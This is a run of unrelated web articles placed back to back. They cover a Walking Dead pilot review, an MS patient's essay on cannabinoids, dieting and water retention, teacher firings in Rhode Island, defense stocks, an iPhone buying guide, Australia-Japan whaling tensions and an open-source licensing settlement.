This new material really underscored the sense of what kind of deep and unsettling world the survivors are now living in .
Darabont 's also done a solid job of knowing what works from The Walking Dead and sometimes reproducing it exactly in his screenplay , such as the case with the bicycle Grimes comes across and the reaction of its former owner to the officer 's arrival .
The Walking Dead pilot does n't sell out its concept for the sake of finding a wider audience .
This is a show set in a world where families have died and the survivors have n't had the time to cope with their losses , much less come to terms with civilization collapsing around them .
Knowing the course that Kirkman 's comic book takes and now after seeing how Darabont 's chose to make the pilot more of a drama than a flat - out horror action show , AMC's Walking Dead has fantastic potential .
The Walking Dead could even do for horror what the new Battlestar Galactica did for science fiction .
Cross your fingers and hope that the show comes together as well as it did on the page .
“ Where Do You Get ‘ It ’ From ? ”
Author : Publius *
Most patients do n’t get asked where they get their medicine .
That ’s because everyone knows people get their medicine from a pharmacy .
But I have to get my medicine otherwise .
I have to safeguard my “ source ” because my medicine is cannabinoid based – and that makes it almost illegal .
–
But not today .
Today I can answer the source question openly because it is my local pharmacy – with drive - thru service and open to dispense medicine 24 hours a day .
I drive up and push a big , yellow smiley - faced button to gain access – a soft automated voice comes over the speaker to verify that I am in the right place in order to pick up my prescription .
Next , the typical professional looking person – white coat with badge – slides open the window asking my name and what I need .
“ I ’m picking up a prescription for Publius . ”
They return with a baggie and bottle containing 30 synthetic cannabinoid capsules dosed at 5 mg each – that ’s right , legal cannabinoids !
What are cannabinoids ?
Well , here is where things get interesting .
As one learns in biology , the human body has many systems – the circulatory , respiratory , digestive , and nervous systems to name a few .
Each system has parts : for example , the nervous system is made up of the brain , spinal cord , and nerves .
By the late 1980s , science identified a new human system – the endocannabinoid system ( ECS ) – also referred to as the cannabinoid system .
There is a cannabinoid system present in all mammals – to include humans and 15,000 other species .
A mammal is any vertebrate animal distinguished by self - regulating body temperature , hair , and milk - producing females – as mammal means “ breast ” or of the breast .
The ECS has two main parts : cannabinoids , which are chemical neurotransmitters , and two receptors called “ CB1 ” and “ CB2 . ”
Cannabinoids activate receptors found throughout the body – in all organs , for example .
In fact , all systems in our bodies are modulated by the cannabinoid system .
This means that as a body system changes , it uses the ECS to do so .
Science and popular search sites like Wikipedia use three classifications of cannabinoids :
1. Endogenous cannabinoids ( also referred to as endocannabinoids ) , which are produced by the human body
2. Herbal cannabinoids , the kind found in the cannabis sativa plant
3. Synthetic cannabinoids , produced and distributed by pharmaceutical companies
The third kind is what I am picking up from the pharmacy – 30 Marinol ( Dronabinol ) capsules .
Marinol is a prescribed cannabinoid from my doctor – and I am going to test it against the herbal cannabinoids I have been baking into my brownies for five years now .
The pharmacist hands me a white paper bag containing the Marinol prescribed for my Multiple Sclerosis ( MS ) .
Stapled to the top is a typical handout with cautionary medical information .
The small amount ( 150mg ) of the synthetic cannabinoid THC costs $ 370 – or more than $ 69,000 per ounce !
I sign my name on a distribution sheet and pay my $ 3 Medicare co-pay .
The government , meaning our tax dollars , pays the other $ 367 for my medicine .
Now I am ready to go – but not before my ‘ synthetic cannabinoid ’ dealer informs me of possible side effects .
She warns me to be on the lookout for – “ dizziness , drowsiness , confusion , feeling ‘ high , ’ an exaggerated sense of well - being , lightheadedness , headache , red eyes , dry mouth , nausea , vomiting , stomach pain , clumsiness , or unsteadiness . ”
Geez – sounds like a lot of potential adversity on my chemically sensitive body .
From personal experience , I know that the herbal cannabinoids do not cause these side effects in my body .
The pharmacist did mention one noticeable side effect that I have had with eating cannabis brownies : dry mouth – which is hardly a problem when considering the overall benefits of the medicine .
When I get home I open the bag to take a look at the Marinol .
The pills are a deep maroon color and perfectly round .
They remind me of Boston Baked Beans – as they look exactly like those candies .
One thing is for sure : synthetic cannabinoids do not look anything like herbal cannabinoids – the ones from the plant itself .
The distinct medical difference of popping pills versus the variations and qualities of consuming natural cannabis cannot be understated – and surely wo n’t be by me .
After a week of taking one pill a night before bed , as the doctor prescribed , I do not notice any positive effects from the Marinol .
It makes me hungry – but that was never a problem in the first place .
However , it is my first legal cannabinoid and that is what counts , right ?
–
Not whether it works , just whether it is legal , right ?
Wrong .
Here is what I know .
I have been self - medicating with herbal cannabinoids for five years to provide relief from MS , which I have had for 23 years .
During that time I went through the long list of prescribed pharmaceuticals .
The relief was minimal .
The problem was ( and is ) the side effects , which became unbearable over time .
I felt like a slave , dependent on a cycle of pharmaceutical use which abused my body and left me in the most depressed , hopeless , and flattened state .
I finally said enough of the pharma - tinkering with my body and the MS and tried baking herbal cannabinoids into brownies .
In doing so , my alternative treatment made me a criminal .
I began to eat a small cube of cannabis brownie three times a day .
Within the first month my insomnia disappeared , my bladder issues calmed , nerve tingles of the arms , legs , and feet stilled .
I was no longer breaking out in upper body tremors after being out in the world of loud noises , traffic , and the everyday racing of life .
The MS was quieter .
I found I was n’t contemplating suicide and I felt hopeful about my life again – but realized I had become a chronic criminal .
Cannabinoids are clearly medicinal to our bodies .
But there is a strange distinction between which cannabinoids are effective and which ones are legal .
In the case of my MS , appetite stimulation has not been a problem – which is what the Marinol is usually prescribed for .
Marinol simply did not work for me .
There are other pharmaceutical cannabinoids – such as Nabilone and Sativex – available in other countries , but they remain expensive and less effective than herbal cannabinoids .
Nature created cannabis and the mammalian ECS , not you or me – and it was through the use of herbal cannabinoids that I was able to wean myself from a life of pharma - cocktails and move toward a healthier life .
– Just as nature designed .

Water retention - what is it ?
Lessons from The Minnesota Experiment
In an ideal world , weight loss would be perfectly linear .
You 'd lose weight in a predictable manner , seeing small but consistent changes each passing day .
But this is rarely the case , which my experience has proven me many times over .
If you 've ever been on a diet and tracked your progress with the scale or the mirror , you 're probably familiar with water retention and long weight loss plateaus .
Even though your diet is on point , nothing seems to be happening .
Stalling at the same scale weight for weeks is not unheard of - I 've experienced it myself .
Fortunately , these phases are followed by rapid weight loss seemingly over night .
This delayed weight loss is often referred to as the " whoosh " - effect .
Nothing for weeks ... and then whoosh , 2 - 4 lbs lost over night .
What triggers a whoosh ?
No one knows , but Lyle McDonald offered a hypothesis based on something his old exercise physiology professor said .
So what 's the big deal here ?
The issue with water retention is the frustration it brings while waiting for the whoosh .
Waking up every morning to see no progress on the scale can have profound effects on your motivation to maintain your diet and training regimen .
Why put in all this effort when nothing is happening ?
Doubt creeps up .
Maybe you 're eating too much ?
Maybe you 're not doing enough cardio , maybe your carb intake is too high ?
So you cut calories and increase cardio in the hopes that it will get the scale moving down again .
If we 're talking water retention ( and not an actual stall ) , this has the potential to actually worsen the situation .
Dumbfounded you watch as your weight creeps up even higher despite your ambitious attempts to set things right .
So at times like these , it 's no wonder that people are likely to say " screw this shit " and go off their diet for a day .
Or two .
Or a week .
In the worst case it triggers a binge that sets them back several days or weeks .
Not good .
Given the negative impact of water retention on your morale , knowing the causes for water retention , and how to deal with it , can be very useful when you find yourself in this situation .
Water retention ( or edema which is the term used by the medical establishment ) is a common , concrete phenomenon that occurs during calorie restriction .
It 's not just some trivial vanity issue unique to the fitness crowd .
The magnitude of water retention varies ; most often it 's mild , but enough to obscure your fat loss results on a short - term basis .
Sometimes it 's more prominent , giving you the impression that nothing is happening for weeks .
More severe types of water retention are a common characteristic of malnutrition and life - threatening starvation ; it can be so extreme that people will appear to lose no weight at all , as greater amounts of fluids accumulate under the skin .
Jewish doctors often observed this phenomenon in the Warsaw ghettos during World War 2 .
Water retention can take many forms , such as swollen watery tissue or as an accumulation of fluids in the stomach , chest , lower body and in between joints .
You might notice it in the form of fat that feels " squishy " or in the form of red strech marks when waking up in the morning .
You can also notice it on your ankles when taking your socks off in the evening ; the pressure from the socks leaves an indentation , which might be barely noticeable ( no water retention ) or big enough to fit half of your thumb in ( an extreme example as told to me by a competitor after three days of post - competition binging and gaining 35 lbs ) .
The latter is called pitting edema .
During starvation , inadequate nutrition depresses the pumping mechanisms within the cell that keeps excess salt and water out .
The cell deteriorates and the distinction between in and out is lost .
However , for the average Joe out there , water retention is more often related to daily shifts in water and salt intake
In the Minnesota Experiment during World War 2 , men willingly embarked on a semi-starvation - like regimen designed by Dr Ancel Keys .
Yes , that 's the same Keys who " discovered " a connection between saturated fat and cardiovascular disease - a controversial figure .
But I digress .
The objective of this study was to observe the effects of semi-starvation and to establish guidelines for properly refeeding war prisoners ( this is critical , since refeeding victims of starvation can lead to cardiac arrest due to massive mineral and electrolyte fluctuations ) .
His findings were later published in two books : The Biology of Human Starvation : Volume I and The Biology of Human Starvation : Volume II A lot can be written about this fascinating experiment , but at this point I want to highlight some curious happenings related to the topic at hand .
First of all , this was n't quite starvation per se .
The men were getting 1500 - 1800 kcal per day , while engaging in moderate amounts of daily activity , and that 's not too far off from the usual diet fare today .
The main difference being that this was done in a controlled setting lasting six months , which is longer than most people would endure a dieting stint .
At the start of the study , the men were losing weight linearly , dropping about 2 lbs per week .
However , after some time the weight loss became erratic and unpredictable .
No longer was it linear , but rather it occurred in " bursts " with long periods of plateaus .
The researchers overseeing the experiment noted that water retention was noticeable in most men and in some cases quite severe .
Half - way through the study the men were allowed a relief dinner to celebrate their progress .
One big meal of 2300 kcal was served ; roasted chicken , potatoes , gravy and strawberry shortcake .
That night everyone got up more often than usual to urinate .
The next day they discovered that they had each lost several pounds .
This was not a one - time occurrence .
When the experiment was over and the refeeding phase began , the men continued to drop weight at an accelerated rate until calories were increased substantially .
What I want you to take away from this is the following : * Refeeding can cause rapid weight loss , a whoosh .
This seems counter intuitive , but it's a phenomenon observed in the scientific literature and retold by many dieters .
My clients experience this , and so do people embarking on diet regimens where planned carb refeeds are integral parts of the plan ( for example , The Ultimate Diet 2.0 ) .*
In my experience , the more severe and rigorous the diet , the higher the likelihood of retaining water .
In simple terms , higher calorie deficits usually result in more erratic , non -linear weight loss .
This is not a proven fact , but rather a hypothesis based on what I have observed throughout the years - and it has some backing if we look at the weight loss curve observed in starvation and studies like The Minnesota Experiment . *
The hypothesis has credibility if we look at the hormonal response to starvation diets .
" Starvation diets " in this context simply mean any diet approach that results in a very high weekly caloric deficit created through diet and / or exercise .
This is perceived as a significant stress to the body , to which it responds with chronically raised levels of cortisol .
Some cortisol is great , but too much of it is very bad ; and studies suggest that cortisol increases in a dose - dependent manner related to the calorie deficit .
Prolonged elevations of cortisol can lead to massive water retention .
If you 've ever been treated with hydrocortisone , a pharmaceutical form of cortisol , you know what I mean . *
The above makes me wonder if the myth of " starvation mode " is actually perpetuated by extreme dieters who find themselves not losing any weight on starvation - level caloric intake ( due to severe water retention obscuring weight loss ) .
While some metabolic slowdown occurs during any diet , it 's never so profound that it completely negates a substantial calorie deficit .
For example , during The Minnesota Experiment the researchers noted a 15 - 20 % reduction in basal metabolic rate at the end of the study ( it was actually 40 % compared to the start of the study , but this was due to a higher body weight ; a large percentage of the drop could be explained by the simple fact that they weighed less and not due to any hormonal impact ) .
Now you know a little bit about the erratic nature of water retention and the impact it can have on your body weight and diet adherence .
In part two I will get a little more practical and tell you about some effective strategies that can help you deal with it if it rears it 's ugly head .
Also , feel free to comment , e-mail me or share your own strategies if you have found something that works for you .
Go ahead and sleep .
I make way more than your Dad .
A school superintendent in Rhode Island is trying to fix an abysmally bad school system .
Her plan calls for teachers at a local high school to work 25 minutes longer per day , each lunch with students once in a while , and help with tutoring .
The teachers ' union has refused to accept these apparently onerous demands .
The teachers at the high school make $ 70,000 - $ 78,000 , as compared to a median income in the town of $ 22,000 .
This exemplifies a nationwide trend in which public sector workers make far more than their private - sector counterparts ( with better benefits ) .
Do n't miss : 10 States Going Crazy Cutting Spending >
The school superintendent has responded to the union 's stubbornness by firing every teacher and administrator at the school .
A sign of things to come ?
Mish Shedlock has the details at Mish 's Global Economic Trend Analysis :
Here is an interesting email from " Jason " regarding high schools in Central Falls Rhode Island .
Jason writes :
Hi Mish ,
As I 'm sure you 're aware , Rhode Island has one of the highest unemployment rates in the nation .
Central Falls is one of the poorest towns in the state .
It looks like the pictures everyone 's seen of Detroit or Flint .
There are lots of boarded up windows , abandoned buildings , decrepit factories with broken windows , etc .
It 's an absolutely depressed community .
According to Wikipedia , the median income in the town is $ 22 k .
Teacher salaries at the high school average $ 72-78 k .
Apparently 50 % of the students at the school are failing all of their classes , and the graduation rate is also under 50 % .
In an effort to turn the school around , the superintendent requested some changes be made whereby the school day would be slightly extended , teachers would perform some extra tutoring , etc .
The union balked and refused the terms , so now she is firing the entire teaching staff of the high school and replacing them .
This is yet another example of unions digging their own graves by refusing to negotiate or accept reasonable terms .
Sentiment is on the side of the superintendent , at least among the folks I have discussed the issue with .
Jason
With that backdrop , please consider Central Falls to fire every high school teacher .
The teachers did n’t blink .
Under threat of losing their jobs if they did n’t go along with extra work for not a lot of extra pay , the Central Falls Teachers ’ Union refused Friday morning to accept a reform plan for one of the worst - performing high schools in the state .
The superintendent did n’t blink either .
After learning of the union ’s position , School Supt .
Frances Gallo notified the state that she was switching to an alternative she was hoping to avoid : firing the entire staff at Central Falls High School .
In total , about 100 teachers , administrators and assistants will lose their jobs .
Gallo blamed the union ’s “ callous disregard ” for the situation , saying union leaders “ knew full well what would happen ” if they rejected the six conditions Gallo said were crucial to improving the school .
The conditions are adding 25 minutes to the school day , providing tutoring on a rotating schedule before and after school , eating lunch with students once a week , submitting to more rigorous evaluations , attending weekly after - school planning sessions with other teachers and participating in two weeks of training in the summer .

ATLANTA ( Reuters ) - Shares of major U.S. defense contractors rose on Monday after the Obama administration unveiled a defense budget for fiscal 2011 that seeks a 3.4 percent increase in the Pentagon ’s base budget and $ 159 million to fund missions in Iraq , Afghanistan and Pakistan .
The Standard & Poor 's Aerospace & Defense Index .
GSPAERO gained about 1.5 percent on Monday .
“ In general it was better than we expected , across the board ” in terms of the increases in the base budget as well as weapons procurement spending , said Craig Fraser , aerospace and defense analyst for debt rating service Fitch Ratings .
Among big names , industry leader Lockheed Martin Corp LMT.
N gained 37 cents , or 0.5 percent , at $ 74.89 while aircraft maker Boeing Co BA.N rose 1.8 percent to $ 61.70 .
Northrop Grumman Corp NOC.N , a provider of ships and unmanned spy planes , rose 2.3 percent to $ 57.92 .
Sanford Bernstein analyst Douglas Harned said in a note to clients that Lockheed was likely to face “ near term margin pressure ” as it is forced to take on more development risks tied to the F - 35 Joint Strike Fighter , the world ’s largest military aircraft program .
Defense Department Secretary Henry Gates said he would dock Lockheed $ 614 million in performance fees because the F - 35 program ’s performance had not met expectations over the past two years .
Gates also replaced the Pentagon ’s manager in charge of the program .
General Dynamics Corp GD.N was up 3.9 percent at $ 69.43 .
Sanford Bernstein said the maker of tanks and ships stood to benefit from increased spending on the war in Afghanistan outlined in the budget .
Defense stocks were overshadowed in 2009 by U.S. defense program cuts and concern that spending growth will slow in coming years as the Obama administration looks to devote more resources to equip soldiers to fight insurgents .
“ With the very large federal deficits that we ’re seeing over the next few years , there will continue to be some concern about defense spending , ” Fraser said .
Among other defense contractors , missile maker Raytheon Co RTN.N gained 1 percent at $ 52.96 , while L - 3 Communications Holdings LLL.N , a provider of systems that monitor and gather intelligence , rose 1.6 percent to $ 84.64 .
Shares of Harris Corp HRS.N , which has seen rising demand for its tactical radios that distribute voice and data in an encrypted form , climbed 4.2 percent to $ 44.74 .
Get ready for your choice of the best iPhones to change dramatically , as Apple prepares the iPhone 12 for its fall release .
Only this year , the new iPhones are arriving later than usual .
That 's a certainty now that Apple 's Sept. 15 event passed without a mention of the iPhone 12 , which means we likely wo n't hear about what Apple is planning until October .
So if you 're in the market for an iPhone , it 's a good idea to wait a little longer .
That 's not because the current iPhones are lacking .
Several of them happen to be among the best phones overall .
But even if you prefer these current models to whatever 's coming in the next few weeks , a new iPhone launch generally means prices fall on the existing models .
So you could find a bargain , even among our top - ranked picks .
Here are our recommendations and rankings for the best iPhones available right at this moment .
What are the best iPhones ?
Based on our testing , the iPhone 11 is the best iPhone for most people , given its powerful processor and the fact that its cameras support the same photo features as the pricer iPhone 11 Pro models even though the iPhone 11 gets by with just two rear cameras .
If you 're less constrained by budget , the iPhone 11 Pro Max is the iPhone to get , thanks to its bright , expansive OLED screen and long battery life .
For people who balk at high phone prices , the iPhone SE will be ideal .
At $ 399 , it 's the cheapest iPhone available , and it's a compact phone for people who do n't care for 6 - inch - plus screens .
Apple ’s $ 999 iPhone 11
Pro is another option for people who like compact phones , while people who like bigger screens but hate big prices can turn to the $ 599 iPhone XR .
The best iPhone you can buy right now
( Image credit : Tom's Guide )
1. iPhone 11
The best iPhone you can buy Screen Size : 6.1 - inch LCD ( 1792 x 828 ) | Processor : A13 Bionic | Cameras : Dual 12 MP wide ( ƒ / 1.8 ) and ultra wide ( ƒ/2.4 ) / 12 MP front ( ƒ / 2.2 ) | RAM / Storage : 4GB/64GB , 256GB , 512GB Low Stock $ 699 View at Amazon $ 200 off with trade - in $ 699 View at Apple $ 699.99 View at Newegg Affordable price Great battery life Faster A13 processor 64GB of storage in base model
No fast charger included
The iPhone 11 replaced the iPhone XR as the iPhone for everyone , and it's proven to be Apple 's most popular smartphone .
It 's easy to see why : While the iPhone XR debuted at $ 749 in 2018 , the iPhone 11 ’s starting price has dropped to $ 699 — a full $ 300 lower than what Apple ’s Pro series iPhones currently cost .
Even better , the trade - offs you make for that lower price are minimal .
The iPhone 11 has the same A13 Bionic processor found in the iPhone 11 Pro , and its performance is on par with Apple ’s pricier phones ( and still well ahead of the top Android handsets ) .
You are giving up a telephoto lens , as the iPhone 11 features a 12 - MP wide angle and ultra wide angle shooters , but it ’s capable of the same camera effects as the iPhone 11 Pro , including portrait shots , ultra wide angle selfies and Night Mode for better low - light photos .
You can also expect more than 11 hours of battery life from the iPhone 11 , though you ’ll have to spring for a separately - sold fast - charging adapter to juice back up at the quickest speeds .

You can't keep a good iPhone down , which is why Apple revived the iPhone SE four years after launching the original low - cost , compact iPhone .
The iPhone SE 2020 is a little larger than before — adopting the 4.7 - inch screen and form factor of the discontinued iPhone 8 — but it 's kept a low price that will appeal to iPhone fans looking for the best bargain around .
It 's not just the price that makes the iPhone SE so appealing .
The phone runs on the same A13 processor you 'll find in all three iPhone 11 models , so the iPhone SE will remain a top - performing phone for years into the future , especially as regular iOS updates add new features .
You 'll just get one rear camera with this phone , but it 's a good one , augmented by the A13's Neural Engine to augment your photos with computational photography .
This is n't the longest - lasting iPhone by any stretch of the imagination , as our iPhone SE 2020 battery tests found , and we wish that camera would support Apple 's Night mode for better low - light photography .
But if you want some premium power in a phone that fits comfortably in one hand , the iPhone SE was built with you in mind .

3. iPhone 11 Pro Max
The best big- screen iPhone Screen Size : 6.5 - inch Super Retina XDR ( 2688 x 1242 ) | Processor : A13 Bionic | Cameras : Triple 12 MP wide ( ƒ / 1.8 ) , ultra wide ( ƒ / 2.4 ) and telephoto ( f/2.0 ) / 12 MP front ( ƒ / 2.2 ) | RAM / Storage : 4GB/64GB , 256GB , 512GB $ 1,099 View at Amazon $ 1,099.99 View at Best Buy $ 1,249 View at Apple Triple rear cameras with ultra wide lens Best battery life on an iPhone Faster A13 processor Skimpy storage on base model
The most expensive iPhone
Apple says its iPhone Pro models are aimed at professionals who rely on their smartphone to get work done , though it ’s not going to stop you from buying the iPhone 11 Pro Max if you want one of the best phones available .
We ’re particularly impressed by the iPhone 11 Pro Max ’s Super Retina XDR display , which outshines other big - screen phones .
Even with that expansive 6.5 - inch screen and the powerful A13 Bionic processor inside the 11 Pro Max , this model has the longest - lasting battery Apple ’s ever put in an iPhone .
The iPhone 11 Pro Max lasted more than 11.5 hours on our battery test , placing it among devices with the best phone battery life .
Cameras also highlight the iPhone 11 Max Pro , with a 12 - megapixel telephoto lens joining the 12 - MP wide and ultra wide angle cameras Apple includes on the iPhone 11 .
The extra cameras are appreciated , particularly when the iPhone shows a preview of what the ultra - wide angle lens is capturing when you ’re shooting the main lens .
But the real improvement comes from software enhancements like a new Night Mode that helps the iPhone 11 Max produce low - light shots that match what you get from the best camera phones , though the quad - lens Galaxy S20 Ultra ratchets up the pressure on Apple .
We wish the iPhone 11 Pro Max came with enough storage to live up to that Pro moniker — the base model ’s 64GB is too skimpy .
But other features like an included fast charger and durable design make the iPhone 11 Pro Max the choice if money is no object .

4. iPhone 11 Pro Great triple cameras in a compact design Screen Size : 5.8 - inch Super Retina XDR ( 2436 x 1125 ) | Processor : A13 Bionic | Cameras : Triple 12 MP wide ( ƒ / 1.8 ) , ultra wide ( ƒ / 2.4 ) and telephoto ( f/2.0 ) / 12 MP front ( ƒ / 2.2 ) | RAM / Storage : 4GB/64GB , 256GB , 512GB $ 849.97 View at Amazon $ 849.97 View at Amazon $ 999.99 View at Best Buy Fantastic triple rear cameras Faster A13 processor Brighter OLED display Skimpy storage in base model Shorter battery life than iPhone 11 , iPhone 11 Pro Max
Between the iPhone 11 ’s low price and the iPhone 11 Pro Max ’s giant screen and equally large battery life , it might be tempting to overlook the iPhone 11 Pro .
But if you value phones that fit comfortably in the hand , this 5.8 - inch device is the perfect iPhone for you .
That screen is the same Super Retina XDR panel found on the 11 Pro Max , so you ’ll get a seriously bright display with wide color support .
You ’ll enjoy the same three camera setup featured on the iPhone 11 Pro Max , too .
In fact , apart from battery life — which could be a lot better on the iPhone 11 Pro — you ’re getting a lot of the same features found on the 11 Pro Max , such as an included fast charger , faster modem , and the ability to survive a plunge in up to 4 meters of water .
All that comes in a more compact phone , which for fans of smaller devices , will be the best feature of all .
If it 's the compact size of the iPhone 11 Pro that appeals to you , be aware that a 5.4 - inch iPhone will reportedly be part of the iPhone 12 lineup .
Otherwise , Apple 's iPhone 12 releases are expected to have screens that are 6.1 inches and larger .

The iPhone XR is proof you do n't have to pay top dollar to get one of the best iPhones , and now that the price has dropped to $ 599 , it ’s an even better buy .
The XR has an LCD panel , not the OLED screen found in the more expensive iPhones , and you 'll have to get by with just a single rear camera while the similarly sized iPhone 11 features two lenses .
But for many users , those wo n't be significant sacrifices , especially in light of what you get in return .
Though the newer iPhone 11 models have a faster processor , the A12 Bionic powering the iPhone XR still outperforms many top Android smartphones .
The iPhone XR also gets great battery life — on par with our iPhone 11 test results and only 15 minutes behind the iPhone 11 Pro Max ’s 11 hour , 40 minute result .
And if you value design , you 'll appreciate the rainbow of colors the iPhone XR comes in .
The iPhone XR is n't very compact , but it delivers a great balance of price and performance , even with the iPhone 11 delivering more features .
See our full iPhone XR review .
How to choose the best iPhone for you
The best way to determine the iPhone you should buy is to take stock of the features and capabilities that matter most to you .
If battery life is especially important , seek out one of the Max or Plus variations ; these larger phones have bigger batteries to match .
What 's more , because iOS is known to be generally efficient in terms of energy consumption , even the smaller models tend to last longer than average on a charge .
If you 're basing your next iPhone purchase off camera quality , the top - tier Pro variants are easy recommendations , thanks to triple - lens designs that allow you to capture multiple different perspectives , from zoomed - out ultra wide - angle images to shallow depth - of - field portraits .
They 're also remarkably good in challenging lighting scenarios , like when shooting in a dimly - lit indoor space , or outdoors at night .
All that said , if price is king , and saving the absolute most on your next smartphone purchase is your top priority , you should have no reservations about nabbing an iPhone SE 2020 or iPhone XR .
These may be on the cheaper side of Apple 's range , but they 're still made of flagship - quality materials , with enough power and performance to sustain years of use .
However , be mindful of storage .
Apple 's most recent iPhones start at $ 699 for the iPhone 11 , with prices spiking upward for the iPhone 11 Pro ( $ 999 ) and iPhone 11 Pro Max ( $ 1,099 ) .
Those base prices get you a phone with 64GB of space , but if you want more capacity , be prepared for that price tag to go up .
A 256GB iPhone 11 Pro will cost you $ 1,149 , for example , while the 512GB model brings the price to $ 1,349 .
If you buy your iPhone through Apple , you may be able to save money by trading in your current phone .
Apple 's trade - in rebates range from up to $ 170 off for iPhone SE 2020 purchases to a potential $ 280 discount if you 're buying an iPhone 11 Pro model .
You can save up to $ 220 on the iPhone 11 with a trade - in .
When Apple releases new iPhones , it cuts the price on the models it keeps around .
The iPhone XR now costs less than $ 600 , for example .
That means if you wait until this fall 's iPhone 12 release , you could see prices drop on some of the models listed here — assuming Apple keeps them in the smartphone lineup .
But as we mentioned , the iPhone 12 is n't expected until October at the earliest ( though Apple still may hold a launch event after its Sept. 15 Apple Watch launch ) .
Apple is expected to release four new iPhones — a 5.4 - inch iPhone 12 , a 6.1 - inch iPhone 12 Max , a 6.1 - inch iPhone 12 Pro and a 6.7 - inch iPhone 12 Max .
All four phones will have 5G connectivity and feature OLED screens .
The Pro models are expected to add a LiDAR sensor similar to the one on the iPad Pro , and they could feature displays with faster 120 Hz refresh rates .
If any of these rumored features strike your fancy , it may be worth holding out until October when the iPhone 12 likely debuts .
Check out our iPhone 12 hub for the latest rumors on Apple 's upcoming phones .
All of the iPhones mentioned here run the latest version of iOS , Apple 's mobile operating system .
And they 'll be able to upgrade to iOS 14 , the new version that 's going to arrive in the fall around the same time as the iPhone 12 .
( In fact , iPhones dating back to the iPhone 6s and original iPhone SE will be able to run iOS 14 . )
Apple previewed iOS 14 at June 's Worldwide Developer Conference and a public beta for the update is coming this month .
How we test iPhones
As with any smartphone we test at Tom's Guide , we evaluate iPhones for days in real - world use cases .
We also benchmark Apple 's phones using a gamut of performance - measuring apps that allow us to compare iPhone performance to what Android devices are capable of .
In addition to synthetic benchmarks , we also run real - world tests , including a video transcoding test in Adobe Premiere Rush that compares the iPhone 's processing speed with other devices .
In our lab , we use a light meter to ascertain display quality data , like brightness and color accuracy to help us evaluate the display of the best iPhones .
Our proprietary battery test determines longevity on a charge by endlessly streaming webpages over an LTE network ; we then recharge the iPhones to see how quickly they charge in 15 - minute intervals .
To compare cameras , we take any iPhone we review out and shoot photos in a variety of settings .
We also bring along a comparable smartphone to see how the iPhone 's photographic output measures up .
We explore Apple 's iOS improvements , test gaming performance and evaluate the phone 's speakers — and each of these factors play a part in our final verdict .
NZ and Australia have urged both activists and whalers to calm down Australia has set a deadline for Japan to stop whaling in the Southern Ocean by November this year , or face international legal action .
Prime Minister Kevin Rudd said he was still hopeful that talks with Japan would lead to a voluntary halt .
Japan 's Foreign Minister Katsuya Okada is to visit Australia this weekend .
Despite a 1986 international moratorium on commercial whaling , Japan kills hundreds of whales each year , ostensibly for scientific research .
Blunt talk Mr Rudd told the Channel 7 TV station that Australia would " work with the Japanese to reduce , through negotiation , their current catch to zero " .
If we do n't get that as a diplomatic agreement , let me tell you , we 'll be going to the International Court of Justice
Australian PM Kevin Rudd
" If that fails - and I 'm saying this very bluntly ... - if that fails , then we will initiate that court action before the commencement of the whaling season in November 2010 . "
Australia has made such threats before but correspondents say the timing and assertive tone of this statement - coming just one day before Mr Okada is due to visit - gives the words added weight .
The BBC's Nick Bryant in Sydney says Mr Rudd has been criticised for backing away from an election promise to take international legal action against Japan for its annual whale hunt in the Southern Ocean .
Mr Rudd is currently slipping in popularity polls and faces an election this year .
" Now , that is a direct honouring of the commitment I gave to the Australian people .
And that is the right [ way ] to handle it with a friend and partner , Japan , which is also a very significant , long - standing economic partner as well , " he said .
" That 's the bottom line and we 're very clear to the Japanese that 's what we intend to do . "
High risk " Specifically , what we 're putting to the Japanese is to take where they are now , which is the slaughter of some hundreds of whales each year and reduce that to zero , " Mr Rudd said .
THE LEGALITIES OF WHALING Objection - A country formally objects to the IWC moratorium , declaring itself exempt .
Example : Norway Scientific - A nation issues unilateral ' scientific permits ' ; any IWC member can do this .
Example : Japan Aboriginal - IWC grants permits to indigenous groups for subsistence food .
Example : Alaskan Inupiat " If we do n't get that as a diplomatic agreement , let me tell you , we 'll be going to the International Court of Justice . "
Our correspondent notes that international legal action also carries risks .
If the prosecution fails , legal experts say it might embolden the Japanese to expand its activities .
Australia and New Zealand have consistently opposed Japan 's killing of hundreds of whales each year via a loophole in an international moratorium which allows " lethal research " .
Japan 's new government has maintained its support for whaling , which has deep cultural significance for the Japanese people , since coming to power in September .
Mr Okada will meet Mr Rudd and Defence Minister John Faulkner after arriving on Saturday before holding talks with Australian foreign minister Stephen Smith on Sunday .
Japan is Australia 's top export market with sales worth A$ 55 bn ( $ 49 bn , £ 31.7 bn ) in the year to last June .
Anti-whaling groups have made a habit of joining the Japanese ships and trying to prevent them from catching whales .
This has led to several violent confrontations , including the ramming of the Sea Shepherd activist group 's boat .
The group 's leader , Peter Bethune , has been taken to Japan for questioning after he boarded a Japanese whaling ship earlier this week .

The Model Train Software Brouhaha Ends : Open Source Wins
by Ostatic Staff - Feb. 19 , 2010
Although some people viewed it as a tempest in a teapot , the long - running legal case Jacobsen v. Katzer stirred up some seminal open source issues .
We first reported on the dust - up all the way back in August of 2008 , noting that the dispute centered around -- of all things -- model train software .
Specifically , Jacobsen had developed JMRI , the Java Model Railroad Interface project .
When Katzer built the code for the project into proprietary model train software , deleting existing copyright notices within the code , Jacobsen filed suit .
Now , settlement documents are available online , and the end of the dispute points to a final victory for open source licenses .
The settlement documents show that Katzer will pay Jacobsen $ 100,000 over 18 months , cease using the JMRI code , and not attempt to register domains using the JMRI name .
Previously , the legal dispute had gone all the way to the United States Court of Appeals for the Federal Circuit , which is the last legal stop before the Supreme Court .
As Lawrence Lessig noted in a post , when the Court of Appeals upheld the Artistic License that governed the use of JMRI , it was " an important victory " for free licenses .
Lessig noted that the decision had broad implications for many open source licenses .
The settlement between Jacobsen and Katzer was probably inevitable , but as noted open source pundit Andy Updegrove writes today :
" The software underlying such an important legal dispute is almost charmingly inconsequential from a commercial point of view - model railroad software .
But to the litigants , the stakes were high relative to their resources and their commitment to that niche ... While FOSS software has become pervasive throughout the world , the licenses under which such software is made available are only just now becoming subject to disputes being heard in courts .
Because the courts of most countries , such as the United States , are obligated to enforce the same legal holdings on similar facts that courts in their jurisdiction have previously handed down , the outcomes of these first cases are extremely important . "
Most open source licenses , including the GPL , are based on the rights of copyright holders .
Katzer , the defendant in this long - running case , had argued that violating the distribution rules for an open source project does n't necessarily remove the right to distribute the software .
In its findings in favor of Jacobsen , the Court of Appeals said that " copyright holders who engage in open source licensing have the right to control the modification and distribution of copyrighted material . "
That 's important , and with the settlement between Jacobsen and Katzer , the final shoe has dropped , with a precedent set that will help defend open source licenses in the future .

